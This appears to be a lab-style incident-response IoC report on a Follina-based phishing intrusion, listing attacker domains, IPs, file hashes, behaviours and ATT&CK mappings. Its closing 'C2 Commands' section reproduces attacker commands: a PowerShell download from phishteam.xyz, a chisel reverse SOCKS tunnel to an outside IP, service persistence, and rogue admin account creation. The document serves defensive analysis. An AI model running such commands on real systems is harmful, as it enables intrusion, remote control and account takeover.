
## Extracted IoCs 

### Domains
```
phishteam.xyz
resolvecyber.xyz
```

### IPs
```
167.71.199.191
167.71.222.162
```

### Files
```
free_magicules.doc
update.zip
first.exe
ch.exe
spf.exe
final.exe
```

#### free_magicules.doc

| MD5         | `09b09dc651d921fe022b16c234e64a12`                                 |
| ----------- | ------------------------------------------------------------------ |
| SHA-1       | `36e718533b9530002143f69fd15b679208096aec`                         |
| SHA-256     | `e25f32401fd3d25958b8b99f280f0325b232e54f185cc5d6e0710923005ac64a` |
| File type   | Win32 EXE                                                          |
| File size   | 1.54 MB                                                            |
| Family name | WINWORD.EXE                                                        |

**Behavioral Info**
```
Initial infection document
Delivered through Chrome download
Exploited CVE-2022-30190 (Follina)
Triggered MSDT execution
Executed embedded Base64 PowerShell payload
```

**Network Indicators**
```
phishteam.xyz
http://phishteam.xyz/02dcf07/update.zip
```

**ATT&CK Mapping**
```
T1204     User Execution
T1203     Exploitation for Client Execution
T1059.001 PowerShell
```

---

#### update.zip

 **Behavioral Info**
```
Downloaded by PowerShell
Extracted into Startup folderUsed to establish persistence
Deleted after extraction
```

**Network Indicators**
```
http://phishteam.xyz/02dcf07/update.zip
phishteam.xyz
```

**ATT&CK Mapping**
```
T1105     Ingress Tool Transfer
T1547.001 Startup Folder Persistence
```

---

#### first.exe

**Behavioral Info**
```
Stage 2 malware payload
Executed host reconnaissance
Enumerated users and administrator groups
Executed whoami and net commands
Downloaded and launched remote access tooling
Performed DNS resolution
```

**Network Indicators**
```
phishteam.xyz
resolvecyber.xyz
167.71.222.162
```

**ATT&CK Mapping**
```
T1105      Ingress Tool Transfer
T1033      System Owner/User Discovery
T1087      Account Discovery
T1069.001  Local Group Discovery
T1083      File and Directory Discovery
T1049      Network Connections Discovery
```

---

#### ch.exe

| MD5         | `527c71c523d275c8367b67bbebf48e9f`                                 |
| ----------- | ------------------------------------------------------------------ |
| SHA-1       | `7902b08fb184cfb9580d0ad950baf048a795f7c1`                         |
| SHA-256     | `8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451` |
| File type   | `Win32 EXE`                                                        |
| File size   | 7.85 MB                                                            |
| Family name | `chisel.exe`                                                       |

**Behavioral Info**
```
Reverse SOCKS proxy client
Provided attacker pivoting capability
Established remote access channel
Maintained outbound connection to attacker infrastructure
```

**Network Indicators**
```
167.71.199.191:8080resolvecyber.xyz
```

**ATT&CK Mapping**
```
T1090        ProxyT1021        Remote Services
```

---

#### spf.exe

| MD5         | `108da75de148145b8f056ec0827f1665`                                 |
| ----------- | ------------------------------------------------------------------ |
| SHA-1       | `188098b9caf3bc4d1b68dcad50d2e1cbd2e9d519`                         |
| SHA-256     | `8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d` |
| File type   | `Win32 EXE`                                                        |
| File size   | 26.50 KB                                                           |
| Family name | `PrintSpoofer64.exe`                                               |
[itm4n/PrintSpoofer: Abusing impersonation privileges through the "Printer Bug"](https://github.com/itm4n/PrintSpoofer)

**Behavioral Info**
```
Downloaded after attacker gained shell access
Executed prior to SYSTEM-level access
Likely privilege escalation component
Used during escalation phase
```

**Network Indicators**
```
http://phishteam.xyz/02dcf07/spf.exe
phishteam.xyz
```

**ATT&CK Mapping**
```
T1105      Ingress Tool Transfer
T1068      Exploitation for Privilege Escalation
```

---

#### final.exe

| MD5       | 4c014f94a8fa0b484a2edab422ab2a1a                                 |
| --------- | ---------------------------------------------------------------- |
| SHA-1     | 1cd504a2599c5287e6a90d59780bd57fbba1e923                         |
| SHA-256   | 03e1840a24506afc88ab5ff7f83d2b07b558b34ff42dd34dd93267fd2e7a74e6 |
| File type | Win32 EXE                                                        |
| File size | 499.70 KB                                                        |


**Behavioral Info**
```
Downloaded after privilege escalation
Installed as persistent service
Executed under LocalSystem account
Maintained long-term access
```

**Network Indicators**
```
http://phishteam.xyz/02dcf07/final.exe
phishteam.xyz
```

**ATT&CK Mapping**
```
T1105       Ingress Tool Transfer
T1543.003   Create or Modify System Process: Windows Service
T1078       Valid Accounts (post-compromise persistence context)
```

---


#### Processes
```
winword.exe 
msdt.exe
powershell.exe
certutil.exe
wsmprovhost.exe
ch.exe
spf.exe
final.exe
```


#### Service: TempestUpdate2

**Behavioral Info**
```
Auto-start Windows service
Executes final.exe
Runs as LocalSystem
Provides persistence across reboots
```

**Network Indicators**
```
Indirectly associated with final.exe communications
```

**ATT&CK Mapping**
```
T1543.003 Create or Modify System Process: Windows Service
```


#### URLs
```
http://phishteam.xyz/02dcf07/update.zip
http://phishteam.xyz/02dcf07/first.exe
http://phishteam.xyz/02dcf07/ch.exe
http://phishteam.xyz/02dcf07/spf.exe
http://phishteam.xyz/02dcf07/final.exe
```

#### ATT&CK IoCs
T1204 - User Execution  
T1203 - Exploitation for Client Execution  
T1059.001 - PowerShell  
T1105 - Ingress Tool Transfer  
T1547.001 - Startup Folder Persistence  
T1543.003 - Windows Service Persistence  
T1033 - System Owner/User Discovery  
T1087 - Account Discovery  
T1069.001 - Local Group Discovery  
T1083 - File and Directory Discovery  
T1049 - Network Connections Discovery  
T1068 - Privilege Escalation  
T1090 - Proxy  
T1136.001 - Create Local Account  
T1098 - Account Manipulation  
T1021.006 - Windows Remote Management  
T1552.001 - Credentials In Files




#### C2 Commands

**Discovery**
```powersell
whoami
net users
net localgroup administrators
net user benimaru
netstat -ano -p tcp
dir C:\Users
```

**Initial Access**
```powersell
powershell iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe
```

**Credential Access**
```powershell
cat C:\Users\Benimaru\Desktop\automation.ps1
net user Administrator ch4ng3dpassword!
```

**Persistence**
```powersell
sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
sc.exe qc TempestUpdate2
```

**Account Manipulation**
```powersell
net user shuna ...
net user shion ...
net localgroup administrators shion /add
net user Administrator <new password>
```

**Privilege Escalation**
```powersell
whoami /priv
net localgroup administrators /add shion
``` 

**Remote Access**
```powershell
ch.exe client 167.71.199.191:8080 R:socks
```

**Account Creation**
```powershell
net user /add shuna princess
net user /add shion m4st3rch3f!
```
